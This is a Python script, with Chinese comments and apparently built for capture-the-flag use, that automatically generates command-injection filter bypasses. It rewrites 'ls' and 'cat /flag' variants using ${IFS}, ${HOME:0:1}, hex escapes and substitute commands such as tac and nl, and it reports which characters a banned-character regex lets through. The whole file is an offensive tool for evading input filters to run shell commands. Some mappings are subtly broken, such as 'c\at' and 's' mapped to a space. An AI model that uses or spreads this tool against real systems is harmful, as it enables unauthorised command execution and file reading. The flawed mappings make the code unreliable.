import re
import string

# 字符替换映射表：定义每个字符的多种替换方案
# 键为原始字符，值为可替换的字符列表
char_replacements = {
    'a': ['a', 'A', '${a}', '\x61'],
    'b': ['b', 'B', '\x62'],
    'c': ['c', 'C', '\x63'],
    'd': ['d', 'D', '\x64'],
    'e': ['e', 'E', '\x65'],
    'f': ['f', 'F', '\x66'],
    'g': ['g', 'G', '\x67'],
    'h': ['h', 'H', '\x68'],
    'i': ['i', 'I', '\x69'],
    'j': ['j', 'J', '\x6a'],
    'k': ['k', 'K', '\x6b'],
    'l': ['l', 'L', '\x6c'],
    'm': ['m', 'M', '\x6d'],
    'n': ['n', 'N', '\x6e'],
    'o': ['o', 'O', '\x6f'],
    'p': ['p', 'P', '\x70'],
    'q': ['q', 'Q', '\x71'],
    'r': ['r', 'R', '\x72'],
    's': ['s', 'S', '\x73', '\x20'],
    't': ['t', 'T', '\x74'],
    'u': ['u', 'U', '\x75'],
    'v': ['v', 'V', '\x76'],
    'w': ['w', 'W', '\x77'],
    'x': ['x', 'X', '\x78'],
    'y': ['y', 'Y', '\x79'],
    'z': ['z', 'Z', '\x7a'],
    ' ': [' ', '${IFS}', '$IFS', '\x20', '${IFS%??}'],
    '/': ['/', '\x2f', '${HOME:0:1}'],
    '-': ['-', '\x2d']
}

# 常用命令集：仅保留ls和cat两个命令的多种变体
# 键为命令名称，值为该命令的不同表达方式列表
common_commands = {
    'ls': ['ls', 'l\\s', 'ls -la', 'ls -l', 'ls /', 'dir', 'ls${IFS}-la'],
    'cat': ['cat', 'c\at', 'ca	', 'cat /flag', 'tac /flag', 'more /flag', 'less /flag', 'nl /flag', 'cat${IFS}/flag']
}

# 生成单个命令的绕过方案
# 参数:
#   command: 需要绕过的原始命令
#   regex: 编译好的正则表达式对象，用于检测字符是否被禁用
# 返回值:
#   绕过后的命令字符串，若无法绕过则返回None
def generate_bypass(command, regex):
    bypass = []
    for char in command:
        if regex.match(char):
            found = False
            if char in char_replacements:
                # 尝试所有可能的替换字符
                for replacement in char_replacements[char]:
                    valid = True
                    # 检查替换字符中的每个字符是否都有效
                    for c in replacement:
                        if regex.match(c):
                            valid = False
                            break
                    if valid:
                        bypass.append(replacement)
                        found = True
                        break
            if not found:
                return None
        else:
            bypass.append(char)
    return ''.join(bypass)

# 为常用命令生成所有可能的绕过方案
# 参数:
#   regex_pattern: 用于检测禁用字符的正则表达式模式
# 返回值:
#   字典，键为命令名称，值为该命令的所有有效绕过方案列表
def generate_bypass_commands(regex_pattern):
    regex = re.compile(regex_pattern)
    result = {}
    
    for cmd_name, variants in common_commands.items():
        valid_variants = []
        # 检查原始命令变体是否可用
        for variant in variants:
            valid = True
            for char in variant:
                if regex.match(char):
                    valid = False
                    break
            if valid:
                valid_variants.append(variant)
        
        # 如果原始变体不可用，则尝试生成绕过方案
        if not valid_variants:
            for variant in variants:
                bypass = generate_bypass(variant, regex)
                if bypass:
                    valid_variants.append(bypass)
        
        result[cmd_name] = valid_variants if valid_variants else ['未找到可用的绕过方案']
    
    return result

# 获取命令的替代方案（如cat的替代命令tac、more等）
# 参数:
#   cmd: 原始命令
# 返回值:
#   替代命令列表
def get_alternatives(cmd):
    alternatives = []
    if cmd.startswith('cat '):
        file = cmd[4:]
        alternatives.extend([f'tac {file}', f'more {file}', f'less {file}', f'nl {file}'])
    elif cmd == 'ls' or cmd.startswith('ls '):
        alternatives.extend(['dir', 'echo *'])
    return alternatives

# 分析字符是否被禁用
# 参数:
#   regex_pattern: 用于检测禁用字符的正则表达式模式
# 返回值:
#   禁用字符列表

def analyze_characters(regex_pattern):
    regex = re.compile(regex_pattern)
    result = {'banned': [], 'allowed': []}
    for char in string.printable:
        if regex.match(char):
            result['banned'].append(char)
        else:
            result['allowed'].append(char)
    return result